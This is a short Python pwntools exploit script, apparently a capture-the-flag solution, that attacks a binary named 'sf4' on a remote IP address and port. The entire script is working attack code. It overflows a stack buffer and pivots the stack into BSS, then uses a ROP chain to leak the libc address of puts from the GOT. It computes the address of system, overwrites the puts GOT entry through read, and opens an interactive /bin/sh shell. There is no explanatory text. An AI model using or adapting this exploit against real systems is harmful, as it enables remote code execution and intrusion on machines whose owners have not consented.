from pwn import*
#p = process('./sf4')
p = remote('35.194.245.237',8082)

pr = 0x8048359
pppr = 0x8048599

bss = 0x804A040+0x500
LR = 0x80484D5
RLR = 0x80484C4

puts_plt = 0x8048380
puts_got = 0x804A010
read_plt = 0x8048370

p.recvuntil('!!\n')

# exploit
pay = ''
pay += 'a'*0x28			# buf
pay += p32(bss+0x28)		# sfp
pay += p32(RLR)			# ret only one !
p.send(pay)
#raw_input()
rop1 = ''
rop1 += p32(bss+0x78)
rop1 += p32(puts_plt)		# start
rop1 += p32(pr)
rop1 += p32(puts_got)		# leak clear
rop1 += p32(RLR)
rop1 += 'a'*(0x28-len(rop1))
rop1 += p32(bss)
rop1 += p32(LR)
p.send(rop1)
libc_puts = u32(p.recv(4))
libc_base = libc_puts - 392352
#libc_system = libc_base + 241056
libc_system = libc_puts - 0x24800
print(hex(libc_puts))
print(hex(libc_system))
rop2 = ''
rop2 += 'X'*4
rop2 += p32(read_plt)
rop2 += p32(pppr)
rop2 += p32(0)
rop2 += p32(puts_got)
rop2 += p32(0x10)		# overwrite stage 1
rop2 += p32(puts_plt)	
rop2 += 'x'*4
rop2 += p32(puts_got+4)		# exploit clear
rop2 += 'b'*(0x28-len(rop2))
rop2 += p32(bss+0x50)
rop2 += p32(LR)
p.send(rop2)


p.sendline(p32(libc_system)+'/bin/sh\x00')	
p.interactive()
